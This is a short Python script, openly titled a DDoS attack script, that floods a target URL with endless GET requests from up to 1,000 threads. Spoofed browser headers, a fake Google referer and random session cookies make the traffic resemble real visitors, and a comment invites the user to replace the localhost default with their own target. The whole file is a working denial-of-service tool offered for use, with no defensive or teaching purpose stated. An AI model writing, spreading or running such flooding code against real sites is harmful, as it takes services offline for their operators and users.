#!/usr/bin/env python3
"""
DDoS Attack Script using Python Requests
"""

import requests
import threading
import time
import random

def request_loop():
    """Send continuous requests"""
    while True:
        try:
            # Send request with minimal data
            requests.get(target_url, timeout=1, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': 'https://www.google.com/',
                'Cookie': 'session_id=' + str(random.randint(1000000, 9999999))
            })
        except:
            pass

def attack(target_url, threads=100):
    """Perform DDoS attack on target URL"""
    
    # Create and start threads
    for _ in range(threads):
        thread = threading.Thread(target=request_loop)
        thread.daemon = True
        thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Attack stopped.")

if __name__ == "__main__":
    target_url = "http://localhost:3000/"  # Replace with your target URL
    threads = 1000  # Number of concurrent requests
    
    print(f"Starting DDoS attack on {target_url} with {threads} threads...")
    attack(target_url, threads)